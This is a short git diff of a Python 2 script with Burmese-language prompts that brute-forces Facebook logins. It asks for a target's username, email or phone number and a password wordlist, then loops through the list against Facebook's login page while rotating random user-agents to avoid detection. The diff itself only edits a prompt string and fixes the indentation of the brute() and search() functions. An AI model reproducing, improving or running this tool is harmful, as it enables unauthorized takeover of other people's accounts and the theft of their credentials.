@@ -7,7 +7,7 @@ import random
 
 email = str(raw_input("user nameထည့္ (or) Emailထည့္(or) Phone နံပါတ္ထည့္: "))
 
-passwordlist = str(raw_input("password fileထည့္ : ")) 
+passwordlist = str(raw_input("password file : ")) 
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 
@@ -28,7 +28,7 @@ def main():
  search()
 print("Password မေတြ႕ပါခင္ဗ်ာ") 	
  
- def brute(password):
+def brute(password):
   sys.stdout.write("\r[*] ႀကိဳးစားေနသည္ ..... {}\n".format(password))
   sys.stdout.flush()
   br.addheaders = [('User-agent', random.choice(useragents))]	
@@ -43,8 +43,7 @@ print("Password မေတြ႕ပါခင္ဗ်ာ")
    raw_input("ထြက္ရန္နွိပ္ပါတစ္ခုခုနွိပ္ပါ...")			
    sys.exit(1) 			
    
-   
-			def search():	
+def search():	
     global password	
     passwords = open(passwordlist,"r")	
     for password in passwords:	
